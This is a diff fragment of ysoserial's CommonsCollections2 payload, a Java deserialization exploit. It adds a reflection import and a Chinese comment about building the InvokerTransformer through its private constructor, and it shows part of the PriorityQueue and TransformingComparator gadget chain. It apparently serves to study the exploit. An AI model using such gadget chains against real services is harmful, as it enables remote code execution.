@@ -1,5 +1,6 @@
 package ysoserial.payloads;
 
+import java.lang.reflect.Constructor;
 import java.util.PriorityQueue;
 import java.util.Queue;
 
@@ -33,6 +34,7 @@ public class CommonsCollections2 implements ObjectPayload<Queue<Object>> {
 		final Object templates = Gadgets.createTemplatesImpl(command);
 		// mock method name until armed
 		final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
+        //也可以InvokerTransformer反射调用private的构造方法生成transformer，private的构造方法只需要传一个参数。
 
 		// create queue with numbers and basic comparator
 		final PriorityQueue<Object> queue = new PriorityQueue<Object>(2,new TransformingComparator(transformer));
